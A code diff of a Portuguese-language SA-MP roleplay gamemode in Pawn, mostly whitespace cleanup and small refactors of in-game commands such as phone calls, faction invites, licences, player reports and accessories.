-		format(string, sizeof(string), "{FFFF00}Estás a ligar para o número {FF9900}%s", pInfo[giveplayerid][NumeroTelemovel]);
+
+		format(string, sizeof(string), "{FFFF00}Estás a ligar para o número {FF9900}%d", pInfo[giveplayerid][NumeroTelemovel]);
 		SendClientMessage(playerid, COLOR_INFO, string);
-		
+
 	    PlayerActionMessage(playerid, 15.0, "carrega em algumas teclas do seu telemóvel.");
 
 	    SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
 
-		format(string, sizeof(string), "{FFFF00}Estás a receber uma chamada de {FF9900}%s {FFFFFF}(/atender)", pInfo[playerid][NumeroTelemovel]);
+		format(string, sizeof(string), "{FFFF00}Estás a receber uma chamada de {FF9900}%d {FFFFFF}(/atender)", pInfo[playerid][NumeroTelemovel]);
 		SendClientMessage(giveplayerid, COLOR_INFO, string);
 	    PlayerActionMessage(giveplayerid, 15.0, "sente o telemóvel a vibrar.");
 
@@ -16478,7 +16538,7 @@ COMMAND:telefonar(playerid, params[], help)
 
 	    AReceberChamada[giveplayerid] = true;
 	    AReceberChamadaDe[giveplayerid] = playerid;
-	    
+
 		pInfo[playerid][Saldo] -= PRECO_TELEFONAR;
     }
 
@@ -16502,14 +16562,14 @@ COMMAND:sms(playerid, params[], help)
     }
     if(giveplayerid == INVALID_PLAYER_ID) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
     if(pInfo[playerid][Saldo] < PRECO_SMS) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
-    
+
 	pInfo[playerid][Saldo] -= PRECO_SMS;
 	bInfo[pInfo[playerid][Rede]][Bank] += PRECO_SMS;
-	
+
 	if(IsAmigo(giveplayerid, playerid) == 1 || AdminDuty[playerid] == true)
 	{
 		format(name, sizeof(name), "%s", GetPlayerNameEx(playerid));
-		
+
 		format(string, sizeof(string), "{FFFF00}Mensagem enviada para [{52E3BA}%d{FFFF00}]: {FF9900}%s", pInfo[giveplayerid][NumeroTelemovel], mensagem);
 		SendClientMessage(playerid, COLOR_INFO, string);
 	    PlayerActionMessage(playerid, 15.0, "carrega em algumas teclas do seu telemóvel.");
@@ -16587,15 +16647,15 @@ COMMAND:convidar(playerid, params[], help)
 	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
 	if(pInfo[giveplayerid][Faction] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador está numa faction");
 	if(pInfo[playerid][FactionRank] != 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não és Faction Leader");
-	
+
 	format(string, sizeof(string), "Convidaste o jogador %s para a faction!", GetPlayerNameEx(giveplayerid));
 	SendClientMessage(playerid, COLOR_INFO, string);
 	format(string, sizeof(string), "Foste convidado pelo jogador %s para entrares na faction %s! (/aceitar)", GetPlayerNameEx(playerid), fInfo[pInfo[playerid][Faction]][Nome]);
 	SendClientMessage(giveplayerid, COLOR_INFO, string);
-	
+
 	ConvidadorFac[giveplayerid] = playerid;
 	ConviteFac[giveplayerid] = true;
-    
+
 	return 1;
 }
 
@@ -16603,24 +16663,24 @@ COMMAND:aceitar(playerid, params[], help)
 {
 	if(ConviteFac[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhum convite pendente!");
 	if(pInfo[playerid][Faction] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás numa faction");
-	
+
 	new string[128];
-	
+
 	pInfo[playerid][Faction] = pInfo[ConvidadorFac[playerid]][Faction];
 	pInfo[playerid][FactionRank] = fInfo[pInfo[playerid][Faction]][JoinRank];
-	
+
 	format(string, sizeof(string), "Aceitaste o convite para a faction %s!", fInfo[pInfo[playerid][Faction]][Nome]);
 	SendClientMessage(playerid, COLOR_INFO, string);
 	format(string, sizeof(string), "O jogador %s aceitou o convite para a faction!", GetPlayerNameEx(ConvidadorFac[playerid]), fInfo[pInfo[playerid][Faction]][Nome]);
 	SendClientMessage(ConvidadorFac[playerid], COLOR_INFO, string);
-	
+
 	pInfo[playerid][Emprego] = 0;
 	pInfo[playerid][EmpregoNivel] = 0;
 	pInfo[playerid][Rotas] = 0;
-	
+
 	ConvidadorFac[playerid] = INVALID_PLAYER_ID;
 	ConviteFac[playerid] = false;
-	
+
 	return 1;
 }
 
@@ -16628,23 +16688,23 @@ COMMAND:comprarbilhete(playerid, params[], help)
 {
 	if(!PlayerToPoint(2.0, playerid, oInfo[0][AeroportoX], oInfo[0][AeroportoY], oInfo[0][AeroportoZ])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás no sítio de comprar os bilhetes");
 	if(GetPlayerMoneyEx(playerid) < 100) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
-	
+
 	GivePlayerMoneyEx(playerid, -100);
-	
+
 	SendClientMessage(playerid, COLOR_INFO, "Compraste um bilhete de avião! Boa viagem!");
-	SetPlayerPosEx(playerid, 2.384830, 33.103397, 1199.849976);
-	
-	SetTimerEx("Aviao", 120000, false, "i", playerid);
-	
+	SetPlayerPosEx(playerid, 2.384830, 33.103397, 1199.849976, -1, -1);
+
+	SetPlayerTimer(playerid, "Aviao", 120000, false);
+
 	return 1;
 }
 
 COMMAND:ajudatrabalho(playerid, params[], help)
 {
 	new string[128];
-	
+
 	if(pInfo[playerid][Emprego] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Estás desempregado");
-	
+
 	SendClientMessage(playerid, COLOR_ORANGE, "_________________________[ AJUDA TRABALHO ]_________________________");
 	format(string, sizeof(string), "Emprego: {FFFFFF}%s", jInfo[pInfo[playerid][Emprego]][Nome]);
 	SendClientMessage(playerid, COLOR_CHAT, string);
@@ -16677,7 +16737,7 @@ COMMAND:duty(playerid, params[], help)
 			{
 	            PlayerActionMessage(playerid, 15.0, "abre o cacifo e retira a farda e as armas.");
 	            SetPlayerColor(playerid, COLOR_POLICIA);
-	            
+
 	            GivePlayerWeapon(playerid, 3, 100);
 				GivePlayerWeapon(playerid, 24, 100);
 			}
@@ -16695,7 +16755,7 @@ COMMAND:duty(playerid, params[], help)
 			{
 			    PlayerActionMessage(playerid, 15.0, "pega na câmara fotográfica e num bloco de notas e guarda-as na mochila.");
 			    SetPlayerColor(playerid, COLOR_NEWS);
-			    
+
 			    GivePlayerWeapon(playerid, 43, 1000);
 			}
 			case F_GOVERNO:
@@ -16723,7 +16783,7 @@ COMMAND:duty(playerid, params[], help)
 			    SetPlayerColor(playerid, COLOR_WHITE);
 			}
 		}
-		
+
 		switch(pInfo[playerid][FactionRank])
 		{
 		    case 1:
@@ -16764,7 +16824,7 @@ COMMAND:duty(playerid, params[], help)
 			{
 	            PlayerActionMessage(playerid, 15.0, "abre o cacifo e coloca a farda e as armas lá dentro.");
 	            SetPlayerColor(playerid, COLOR_WHITE);
-	            
+
 				ResetPlayerWeapons(playerid);
 			}
 			case F_MEDICOS:
@@ -16807,7 +16867,7 @@ COMMAND:duty(playerid, params[], help)
 			    SetPlayerColor(playerid, COLOR_WHITE);
 			}
 		}
-		
+
 		SetPlayerSkin(playerid, pInfo[playerid][Skin]);
 
 		SendClientMessage(playerid, COLOR_CHAT, "[FACTION:] {FFFFFF}Estás agora fora de serviço");
@@ -16827,26 +16887,13 @@ COMMAND:deixaremprego(playerid, params[], help)
 	}
 
 	if(pInfo[playerid][Rotas] <= 9) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Precisas de 9 rotas no teu trabalho atual para o abandonares");
-	
+
 	pInfo[playerid][Emprego] = 0;
-	
+
 	SendClientMessage(playerid, COLOR_CHAT, "[CENTRO DE EMPREGO:] {FFFFFF}Deixaste o teu emprego!");
 
 	return 1;
 }
-/*
-1: Agricultor
-3: Autocarros
-4: Transportadores de Cereais
-5: Carteiro
-6: Lixeiros X
-7: Transportador de Produtos X
-8: Cimenteiro
-9: Limpa Ruas X
-10: Lenhador
-11: Transportador de Gasolina
-12: Transportador de Dinheiro
-*/
 
 COMMAND:rota(playerid, params[], help)
 {
@@ -16935,14 +16982,14 @@ COMMAND:rota(playerid, params[], help)
 
 	return 1;
 }
-		
+
 COMMAND:creditos(playerid, params[], help)
 {
 	SendClientMessage(playerid, COLOR_ORANGE, "_______________________________[ CRÉDITOS ]_______________________________");
 	SendClientMessage(playerid, COLOR_CHAT, "Gamemode: bruxo");
 	SendClientMessage(playerid, COLOR_CHAT, "Mapping: Snowie");
 	SendClientMessage(playerid, COLOR_CHAT, "Interiores: goviscrap, J4mmyHD, PatrickChucky, KiLLAMANiTALY");
-	SendClientMessage(playerid, COLOR_CHAT, "Includes & Plugins: Zeex, Incognito, d0, OstGot, Y_Less, Double-O-Seven, Lós, Gammix");
+	SendClientMessage(playerid, COLOR_CHAT, "Includes & Plugins: Zeex, Incognito, d0, OstGot, Y_Less, Double-O-Seven, Lós, Gammix, urShadow, Udan11");
 	SendClientMessage(playerid, COLOR_ORANGE, "__________________________________________________________________________");
 
 	return 1;
@@ -16977,7 +17024,7 @@ COMMAND:mostrarcc(playerid, params[], help)
 	SendClientMessage(playerid, COLOR_CHAT, "______________________________________________________________________________________");
 
 	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "mostra o cartão de cidadão a");
-	
+
 	if(!IsAmigo(giveplayerid, playerid) && playerid != giveplayerid)
 	{
 		VirarAmigo(giveplayerid, playerid);
@@ -16994,7 +17041,7 @@ COMMAND:mostrardocumentoscarro(playerid, params[], help)
 	if(IsPlayerInAnyVehicle(playerid))
 	{
 		car = GetPlayerVehicleID(playerid);
-		
+
 		if(cInfo[car][Type] == -1) // pessoal
 		{
   			goto CHAVEPESSOAL;
@@ -17017,7 +17064,7 @@ COMMAND:mostrardocumentoscarro(playerid, params[], help)
 			if(pInfo[playerid][Emprego] != cInfo[car][Type])
 			{
 				SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não pertences a esse emprego!");
-				
+
 				return 1;
 			}
 			else
@@ -17035,13 +17082,13 @@ COMMAND:mostrardocumentoscarro(playerid, params[], help)
 	{
 	    goto CHAVEPESSOAL;
 	}
-	
-    
+
+
 	CARROJOB:
 	{
  		if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
 	   	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
-	   	
+
 		format(string, sizeof(string), "_______________________________[ DOCUMENTOS DO CARRO %s ]_______________________________", GetMatriculaByCarID(car));
 		SendClientMessage(giveplayerid, COLOR_CHAT, string);
 		format(string, sizeof(string), "Proprietário: {FFFFFF}%s", cInfo[car][Prop]);
@@ -17052,8 +17099,8 @@ COMMAND:mostrardocumentoscarro(playerid, params[], help)
 		SendClientMessage(giveplayerid, COLOR_ORANGE, string);
 		SendClientMessage(playerid, COLOR_CHAT, "______________________________________________________________________________________________");
 	}
-    
-    
+
+
     CHAVEPESSOAL:
     {
 	   	if(sscanf(params, "dd", giveplayerid, chave)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/mostardocumentoscarro <playerid> <chave>");
@@ -17170,10 +17217,10 @@ COMMAND:mostrardocumentoscarro(playerid, params[], help)
 
 		SendClientMessage(giveplayerid, COLOR_CHAT, "______________________________________________________________________________________________");
     }
-    
-	
+
+
 	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "mostra os documentos do veículo a");
-	
+
 	return 1;
 }
 
@@ -17187,7 +17234,7 @@ COMMAND:mostrarseguro(playerid, params[], help)
 
 	format(string, sizeof(string), "Mostraste o teu seguro a %s", GetPlayerNameEx(giveplayerid));
 	SendClientMessage(playerid, COLOR_WHITE, string);
-	
+
 	if(pInfo[playerid][Seguradora] == 0)
 	{
 		format(string, sizeof(string), "O jogador %s não tem seguro!", GetPlayerNameEx(giveplayerid));
@@ -17225,73 +17272,22 @@ COMMAND:mostrarlicencas(playerid, params[], help)
     if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
 	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
 
-	new Lig_A[8], Mota_A[8], Pesados_A[8], Barco_A[8], Armas_A[8], Pesca_A[8];
-
 	format(string, sizeof(string), "Mostraste todas as tuas licenças a %s", GetPlayerNameEx(giveplayerid));
 	SendClientMessage(playerid, COLOR_WHITE, string);
-	
-	if(pInfo[playerid][CartaLig] == 1)
-	{
-	    Lig_A = "Sim";
-	}
-	else
-	{
-		Lig_A = "Não";
-	}
-	if(pInfo[playerid][CartaMota] == 1)
-	{
-	    Mota_A = "Sim";
-	}
-	else
-	{
-		Mota_A = "Não";
-	}
-	if(pInfo[playerid][CartaPesados] == 1)
-	{
-	    Pesados_A = "Sim";
-	}
-	else
-	{
-		Pesados_A = "Não";
-	}
-	if(pInfo[playerid][CartaBarco] == 1)
-	{
-	    Barco_A = "Sim";
-	}
-	else
-	{
-		Barco_A = "Não";
-	}
-	if(pInfo[playerid][LicArmas] == 1)
-	{
-	    Armas_A = "Sim";
-	}
-	else
-	{
-		Armas_A = "Não";
-	}
-	if(pInfo[playerid][LicPesca] == 1)
-	{
-	    Pesca_A = "Sim";
-	}
-	else
-	{
-		Pesca_A = "Não";
-	}
-	
+
 	format(string, sizeof(string), "_______________________________[ LICENÇAS DE %s ]_______________________________", GetPlayerNameEx(playerid));
 	SendClientMessage(giveplayerid, COLOR_CHAT, string);
-	format(string, sizeof(string), "Carta de Ligeiros: {FFFFFF}%s", Lig_A);
+	format(string, sizeof(string), "Carta de Ligeiros: {FFFFFF}%s", (pInfo[playerid][CartaLig] == 1) ? ("Sim") : ("Não"));
 	SendClientMessage(giveplayerid, COLOR_ORANGE, string);
-	format(string, sizeof(string), "Carta de Motociclos: {FFFFFF}%s", Mota_A);
+	format(string, sizeof(string), "Carta de Motociclos: {FFFFFF}%s", (pInfo[playerid][CartaMota] == 1) ? ("Sim") : ("Não"));
 	SendClientMessage(giveplayerid, COLOR_ORANGE, string);
-	format(string, sizeof(string), "Carta de Pesados: {FFFFFF}%s", Pesados_A);
+	format(string, sizeof(string), "Carta de Pesados: {FFFFFF}%s", (pInfo[playerid][CartaPesados] == 1) ? ("Sim") : ("Não"));
 	SendClientMessage(giveplayerid, COLOR_ORANGE, string);
-	format(string, sizeof(string), "Carta de Barco: {FFFFFF}%s", Barco_A);
+	format(string, sizeof(string), "Carta de Barco: {FFFFFF}%s", (pInfo[playerid][CartaBarco] == 1) ? ("Sim") : ("Não"));
 	SendClientMessage(giveplayerid, COLOR_ORANGE, string);
-	format(string, sizeof(string), "Pesca: {FFFFFF}%s", Pesca_A);
+	format(string, sizeof(string), "Pesca: {FFFFFF}%s", (pInfo[playerid][LicPesca] == 1) ? ("Sim") : ("Não"));
 	SendClientMessage(giveplayerid, COLOR_ORANGE, string);
-	format(string, sizeof(string), "Uso e porte de arma: {FFFFFF}%s", Armas_A);
+	format(string, sizeof(string), "Uso e porte de arma: {FFFFFF}%s", (pInfo[playerid][LicArmas] == 1) ? ("Sim") : ("Não"));
 	SendClientMessage(giveplayerid, COLOR_ORANGE, string);
 	SendClientMessage(giveplayerid, COLOR_CHAT, "_____________________________________________________________________________________________");
 
@@ -17315,10 +17311,10 @@ COMMAND:dararma(playerid, params[], help)
     if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
 	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
 	if(GetPlayerScore(giveplayerid) < 2) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Nível insuficiente");
-	
+
  	new armaID = GetPlayerWeapon(playerid);
 	new armaMun = GetPlayerAmmo(playerid);
-	
+
  	if(armaID == 0 && armaMun == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens nenhuma arma na não!");
 
 	GivePlayerWeapon(giveplayerid, armaID, armaMun);
@@ -17345,15 +17341,15 @@ COMMAND:pagar(playerid, params[], help)
 	if(GetPlayerMoneyEx(playerid) < montante) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse dinheiro");
 	if(!ProxDetectorS(8.0, playerid, giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás perto do jogador");
 	if(GetPlayerScore(giveplayerid) < 2) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Nível insuficiente");
-    
+
 	GivePlayerMoneyEx(playerid, -montante);
 	GivePlayerMoneyEx(giveplayerid, montante);
-	
+
 	format(string, sizeof(string), "Pagaste %d$ ao jogador %s", montante, GetPlayerNameEx(giveplayerid));
 	SendClientMessage(playerid, COLOR_WHITE, string);
 	format(string, sizeof(string), "Recebeste %d$ do jogador %s", montante, GetPlayerNameEx(playerid));
 	SendClientMessage(giveplayerid, COLOR_WHITE, string);
-	
+
 	PlayerPlayerActionMessage(playerid, giveplayerid, 15.0, "pega em algumas notas e entrega-as a");
 
 	return 1;
@@ -17361,21 +17357,15 @@ COMMAND:pagar(playerid, params[], help)
 
 COMMAND:ajuda(playerid, params[], help)
 {
-	new ajuda[65], string[128];
+	new ajuda[64], string[128];
 
     if(sscanf(params, "s[64]", ajuda)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/ajuda <mensagem>");
-    
-	foreach(new i : Player)
-	{
-		// if(!IsPlayerConnected(i)) continue;
-		if(AdminDuty[i] == false) continue;
 
-		format(string, sizeof(string), "{4C99D9}[AJUDAS:] {FFFFFF}%s (ID:%d): {D6CB85}%s", GetPlayerNameEx(playerid), playerid, ajuda);
-		SendClientMessage(i, COLOR_OWNER, string);
-	}
-	
+    format(string, sizeof(string), "{4C99D9}[AJUDAS:] {FFFFFF}%s (ID:%d): {D6CB85}%s", GetPlayerNameEx(playerid), playerid, ajuda);
+    SendAdminMessage(string);
+
 	SendClientMessage(playerid, COLOR_CHAT, "Pedido de ajuda enviado");
-	
+
 	sStats[0][Ajudas]++;
 
 	return 1;
@@ -17383,19 +17373,38 @@ COMMAND:ajuda(playerid, params[], help)
 
 COMMAND:report(playerid, params[], help)
 {
-	new giveplayerid, reason[65], string[128];
+	new giveplayerid, reason[64], string[256];
 
     if(sscanf(params, "ds[64]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/report <playerid> <razão>");
     if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
 
+    format(string, sizeof(string), "{4C99D9}[REPORTS:] {FFFFFF}%s (ID:%d) reportou %s (ID:%d). Razão: {D6CB85}%s", playerid, GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), giveplayerid, reason);
+    SendAdminMessage(string);
+
+	SendClientMessage(playerid, COLOR_CHAT, "Report enviado");
+
+	return 1;
+}
+
+COMMAND:reportuid(playerid, params[], help)
+{
+	new giveplayerid, reason[64], string[256], found;
+
+    if(sscanf(params, "ds[64]", giveplayerid, reason)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/report <uid> <razão>");
+
 	foreach(new i : Player)
 	{
-		// if(!IsPlayerConnected(i)) continue;
-		if(AdminDuty[i] == false) continue;
+		if(pInfo[i][UID] == giveplayerid)
+		{
+		    format(string, sizeof(string), "{4C99D9}[REPORTS:] {FFFFFF}%s (ID:%d) reportou %s (UID:%d | ID:%d). Razão: {D6CB85}%s", playerid, GetPlayerNameEx(playerid), GetPlayerNameEx(i), giveplayerid, i, reason);
+		    SendAdminMessage(string);
 
-		format(string, sizeof(string), "{4C99D9}[REPORTS:] {FFFFFF}%s reportou %s (ID:%d). Razão: %s", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), giveplayerid, reason);
-		SendClientMessage(i, COLOR_OWNER, string);
+			found = 1;
+			break;
+		}
 	}
+
+	if(found != 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não existe nenhum jogador online com esse UID.");
 
 	SendClientMessage(playerid, COLOR_CHAT, "Report enviado");
 
@@ -17406,16 +17415,16 @@ COMMAND:atestar(playerid, params[], help)
 {
 	if(IsAtGasStation(playerid) == -1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás numa Bomba de Gasolina.");
     if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
-	
+
 	new gasid = IsAtGasStation(playerid);
 	new car = GetPlayerVehicleID(car);
 
 	if(bInfo[gasid][Produtos] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Negócio sem produtos.");
-	
+
 	new string[128];
-	
+
 	format(string, sizeof(string), "{FFFFFF}Introduz quantos litros queres atestar. Preço: {00FF00}%d$ {FFFFFF}por litro", oInfo[0][PrecoAtestarG]);
-	
+
 	ShowPlayerDialog(playerid, DIALOG_ATESTAR, DIALOG_STYLE_INPUT, "{FFFFFF}BOMBA DE GASOLINA", string, "Escolher", "Sair");
 
 	return 1;
@@ -17434,7 +17443,7 @@ COMMAND:licencas(playerid, params[], help)
 	format(string, sizeof(string), "\n{00FF00}[5] {FFFFFF}Carta de Condução de Barco {FF0000}[5000$]"); strcat(sdialog,string);
 
 	ShowPlayerDialog(playerid, DIALOG_LICENCAS, DIALOG_STYLE_LIST, "{FFFF00}Licenças", sdialog, "Selecionar", "Sair");
-    
+
 	return 1;
 }
 
@@ -17444,28 +17453,28 @@ COMMAND:pm(playerid, params[], help)
 
     if(sscanf(params, "ds[128]", giveplayerid, mensagem)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/pm <playerid> <mensagem>");
 	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
-	
+
 	if(pInfo[playerid][Admin] == 0)
 	{
 	    if(pInfo[giveplayerid][Admin] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse jogador não é Administrador");
 	    if(PMStatus[giveplayerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse Administrador tem as PM's desligadas");
-	    
-	    format(string, sizeof(string), "{73C1EB}[PM'S:] {50A34D}PM Enviada {73C1EB}para %s (ID:%d): {FFFFFF}%s", GetPlayerNameEx(giveplayerid), giveplayerid, mensagem);
+
+	    format(string, sizeof(string), "{73C1EB}[PM'S:] {50A34D}PM Enviada {0066CC}para %s (ID:%d): {FFFFFF}%s", GetPlayerNameEx(giveplayerid), giveplayerid, mensagem);
 	    SendClientMessage(playerid, COLOR_WHITE, string);
-	    
- 	    format(string, sizeof(string), "{73C1EB}[PM'S:] {D9AD7C}PM Recebida {73C1EB}de %s (ID:%d): {FFFFFF}%s", GetPlayerNameEx(playerid), playerid, mensagem);
+
+ 	    format(string, sizeof(string), "{73C1EB}[PM'S:] {D9AD7C}PM Recebida {0066CC}de %s (ID:%d): {FFFFFF}%s", GetPlayerNameEx(playerid), playerid, mensagem);
 	    SendClientMessage(giveplayerid, COLOR_WHITE, string);
-	    
+
 	    sStats[0][PMs]++;
 	}
 	else
 	{
-	    format(string, sizeof(string), "{73C1EB}[PM'S:] {73C1EB}PM Enviada {B56BB4}para %s (ID:%d): {FFFFFF}%s", GetPlayerNameEx(giveplayerid), giveplayerid, mensagem);
+	    format(string, sizeof(string), "{73C1EB}[PM'S:] {73C1EB}PM Enviada {0066CC}para %s (ID:%d): {FFFFFF}%s", GetPlayerNameEx(giveplayerid), giveplayerid, mensagem);
 	    SendClientMessage(playerid, COLOR_WHITE, string);
 
- 	    format(string, sizeof(string), "{73C1EB}[PM'S:] {73C1EB}PM Recebida {B56BB4}de %s (ID:%d): {FFFFFF}%s", GetPlayerNameEx(playerid), playerid, mensagem);
+ 	    format(string, sizeof(string), "{73C1EB}[PM'S:] {73C1EB}PM Recebida {0066CC}de %s (ID:%d): {FFFFFF}%s", GetPlayerNameEx(playerid), playerid, mensagem);
 	    SendClientMessage(giveplayerid, COLOR_WHITE, string);
-	    
+
 	    sStats[0][PMs]++;
 	}
 
@@ -17480,7 +17489,7 @@ COMMAND:euromilhoes(playerid, params[], help)
 	if(bInfo[bID][Produtos] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa loja não tem produtos");
 	if(pInfo[playerid][BilheteEuro] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens um bilhete do Euro Milhões.");
 	if(!IsPlayerInRangeOfPoint(playerid, 4, bInfo[bID][ActorX], bInfo[bID][ActorY], bInfo[bID][ActorZ])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Tens de estar perto da caixa");
-	
+
 	new n1, n2, n3, n4, n5, e1, e2;
 	new string[128];
 
@@ -17501,13 +17510,13 @@ COMMAND:euromilhoes(playerid, params[], help)
 	pInfo[playerid][Estrela1] = e1;
 	pInfo[playerid][Estrela2] = e2;
 	pInfo[playerid][BilheteEuro] = 1;
-	
+
 	GivePlayerMoneyEx(playerid, -100);
-	
+
 	bInfo[bID][Produtos]--;
-	
+
 	GuardarJogador(playerid);
-	
+
 	format(string, sizeof(string), "Compraste um bilhete do Euro Milhões. Números: %d-%d-%d-%d-%d | Estrelas: %d-%d", n1, n2, n3, n4, n5, e1, e2);
 	SendClientMessage(playerid, COLOR_INFO, string);
 
@@ -17523,7 +17532,7 @@ COMMAND:removeracessorio(playerid, params[], help)
 	    SendClientMessage(playerid, COLOR_CHAT, "[Acessórios]: {FFFFFF}mala - mochila - chapeu - oculos");
 	    return 1;
 	}
-	
+
 	if(strcmp(acessorio, "mala", true) == 0)
 	{
 	    if(AUsarMala[playerid] == false) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás a usar a mala");
@@ -17552,7 +17561,7 @@ COMMAND:removeracessorio(playerid, params[], help)
 	    RemovePlayerAttachedObject(playerid, 4);
 	    AUsarOculos[playerid] = false;
 	}
-	
+
 	return 1;
 }
 
@@ -17569,12 +17578,12 @@ COMMAND:usaracessorio(playerid, params[], help)
 	    return 1;
 	}
 	new skin = GetPlayerSkin(playerid);
-	
+
 	if(strcmp(acessorio, "mala", true) == 0)
 	{
 	    if(pObjects[playerid][Mala] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
 	    if(AUsarMala[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar mala");
-	    
+
 	    SetPlayerAttachedObject(playerid,2,1210 ,5 ,0.3 ,0.09 ,-0.02 ,5 ,-90 ,40);
 	    AUsarMala[playerid] = true;
 	}
@@ -17582,7 +17591,7 @@ COMMAND:usaracessorio(playerid, params[], help)
 	{
 	    if(pObjects[playerid][Mochila] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
 	    if(AUsarMochila[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar mochila");
-	    
+
 	    SetPlayerAttachedObject(playerid,2,3026 ,1 ,-0.1 ,0 ,0 ,0 ,0 ,0); //
 	    AUsarMochila[playerid] = true;
 	}
@@ -17590,7 +17599,7 @@ COMMAND:usaracessorio(playerid, params[], help)
 	{
 		if(pObjects[playerid][o_2054] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens esse acessório");
 		if(AUsarChapeu[playerid] == true) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já estás a usar chapéu");
-		
+
 		SetPlayerAttachedObject(playerid,3,2054 ,2 ,0.1 ,0.03 ,-0.01 ,0 ,90 ,180);
 		AUsarChapeu[playerid] = true;
 	}
@@ -17778,7 +17787,7 @@ COMMAND:usaracessorio(playerid, params[], help)
 		SetPlayerAttachedObject(playerid,4,19018,2,SkinOffSet[skin][0], SkinOffSet[skin][1], SkinOffSet[skin][2], SkinOffSet[skin][3], SkinOffSet[skin][4], SkinOffSet[skin][5]);
 		AUsarOculos[playerid] = true;
 	}
-	
+
 	return 1;
 }
 
@@ -17801,13 +17810,13 @@ COMMAND:tirarchapeu(playerid, params[], help)
 COMMAND:consumirdrogas(playerid, params[], help)
 {
 	if(pInfo[playerid][Drogas] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não tens drogas");
-	
+
 	pInfo[playerid][Drogas]--;
-	
+
 	SendClientMessage(playerid, COLOR_INFO, "Consumiste droga");
 
-    TimerDroga[playerid] = SetTimerEx("DrugEffect", 100, true, "i", playerid);
-    
+    TimerDroga[playerid] = SetPlayerTimer(playerid, "DrugEffect", 100, true);
+
    	new rand = random(6);
 
 	if(rand == 1) // viciou
@@ -17815,7 +17824,7 @@ COMMAND:consumirdrogas(playerid, params[], help)
     	SendClientMessage(playerid, COLOR_INFO, "Ficaste viciado na droga. Agora tens de a consumir regularmente, caso contrário perderás vida.");
     	pInfo[playerid][Viciado] = 1;
 	}
-    
+
 	return 1;
 }
 
@@ -17825,7 +17834,7 @@ COMMAND:trancar(playerid, params[], help)
 	{
